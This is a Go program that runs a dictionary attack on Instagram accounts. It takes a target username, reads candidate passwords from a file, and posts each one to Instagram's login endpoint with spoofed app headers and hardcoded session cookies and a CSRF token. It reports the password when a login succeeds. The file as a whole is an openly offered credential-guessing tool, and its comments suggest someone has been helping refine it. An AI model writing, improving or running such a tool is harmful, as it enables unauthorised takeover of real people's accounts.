package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// --- Configuration Section ---
const (
	// Login URL (the same AJAX endpoint you were using before)
	loginURL = "https://www.instagram.com/accounts/login/ajax/"

	// Form field names
	usernameField    = "username"
	passwordField    = "enc_password" // Note: The encryption prefix is still hardcoded in the tryPassword function
	optIntoOneTap    = "optIntoOneTap"
	queryParams      = "queryParams"
	trustedDeviceRec = "trustedDeviceRecords"
	loginAttemptCount = "loginAttemptCount"
	isPrivacyPortalReq = "isPrivacyPortalReq"

	// File containing passwords
	passwordsFile = "password.txt"

	// Delay between attempts (in seconds)
	retryDelaySeconds = 2
)

// HTTP Headers (some values are examples or may need dynamic generation)
// Important Note: Hardcoded tokens like CSRFToken and cookies will likely cause issues
// as they are session-specific and expire. This is a major limitation.
var defaultHeaders = map[string]string{
	"User-Agent":       "Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743)",
	"X-CSRFToken":      "z2y86ITZAahahOfRghvrCF3PlUj4wx8N", // Example: This should be dynamic
	"X-Instagram-AJAX": "1023134472",                     // Example: This might change
	"X-Requested-With": "XMLHttpRequest",
	"Referer":          "https://www.instagram.com/accounts/login/",
	"Origin":           "https://www.instagram.com",
	"Content-Type":     "application/x-www-form-urlencoded",
	"X-IG-App-ID":      "936619743392459",                    // Example: This might change
	"X-IG-WWW-Claim":   "hmac.AR0yguz-o9CzH6COPm6FWASXsTwt-9uGK8POXdrEwr7UYcqC", // Example: This should be dynamic
	"Cookie":           `csrftoken=z2y86ITZAahahOfRghvrCF3PlUj4wx8N; mid=aDCkugALAAE0mwBUT4-2EUrl5ufw; ig_did=1E68718D-4352-40B7-AEFF-BBEDAD4A4091; rur="VLL,50771762250,1779555557:01f7212..."`, // Example: These are session-specific
}

// Debug Mode
// If true, more detailed logs will be displayed. Set to false for less output.
var debugMode = true
// --- End of Configuration Section ---

func tryPassword(username, password string) bool {
	data := url.Values{}
	// Note: The #PWD_INSTAGRAM_BROWSER:10:<timestamp>:<password> encryption format
	// is specific, and the timestamp here is static. This is a significant limitation.
	data.Set(passwordField, "#PWD_INSTAGRAM_BROWSER:10:1748019955:"+password)
	data.Set(usernameField, username)
	data.Set(optIntoOneTap, "false")
	data.Set(queryParams, "{}")
	data.Set(trustedDeviceRec, "{}")
	data.Set(loginAttemptCount, "0")
    data.Set(isPrivacyPortalReq, "false")

	client := &http.Client{
		Timeout: 30 * time.Second, // A timeout was added for the client
	}
	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		if debugMode {
			fmt.Println("Error creating request:", err)
		}
		return false
	}

	// Set headers from the configuration
	for key, value := range defaultHeaders {
		req.Header.Set(key, value)
	}

	if debugMode {
		fmt.Println("\n--- Attempting password:", password, "---")
		fmt.Println("Sending request to:", loginURL)
		// fmt.Println("With form data:", data.Encode()) // Displaying form data might be verbose
		fmt.Println("With headers:")
		for key, values := range req.Header {
			fmt.Printf("  %s: %s\n", key, strings.Join(values, ", "))
		}
	}

	resp, err := client.Do(req)
	if err != nil {
		if debugMode {
			fmt.Println("Error sending request:", err)
		}
		return false
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		if debugMode {
			fmt.Println("Error reading response:", err)
		}
		return false
	}
	body := string(bodyBytes)

	if debugMode {
		fmt.Println("Response status:", resp.StatusCode)
		fmt.Println("Response body:", body)
	}

	// Your original success condition
	if resp.StatusCode == 200 && strings.Contains(body, `"authenticated":true`) {
		return true
	}

	// Additional check for security challenge for more clarity in debug mode
	if strings.Contains(body, `"challenge_required"`) || resp.StatusCode == 400 {
		if debugMode {
			fmt.Println("!!! Warning: Security challenge detected by Instagram or bad request (Code: ", resp.StatusCode, ") !!!")
		}
	}
    if resp.StatusCode == 404 {
        if debugMode {
            fmt.Println("!!! Warning: Target URL (", loginURL, ") not found (404) !!!")
        }
    }

	return false
}

func main() {
	fmt.Print("Enter username: ")
	var username string
	fmt.Scanln(&username)

	file, err := os.Open(passwordsFile)
	if err != nil {
		fmt.Println("Error opening passwords file (", passwordsFile, "):", err)
		return
	}
	defer file.Close()

	if debugMode {
		fmt.Println("Starting to read passwords from file:", passwordsFile)
	}

	scanner := bufio.NewScanner(file)
	passwordFound := false
	for scanner.Scan() {
		password := scanner.Text()
		if password == "" { // Skip empty lines
			continue
		}

		fmt.Println("\nAttempting password:", password) // This main message remains

		if tryPassword(username, password) {
			fmt.Println("\n******************************")
			fmt.Println("      Password found:", password)
			fmt.Println("******************************")
			passwordFound = true
			break
		}
		if debugMode {
			fmt.Println("--- End of attempt for password:", password, "---")
		}
		time.Sleep(retryDelaySeconds * time.Second)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading passwords file:", err)
	}

	if !passwordFound {
        fmt.Println("\nFinished processing passwords file. No password was found.")
    }
}
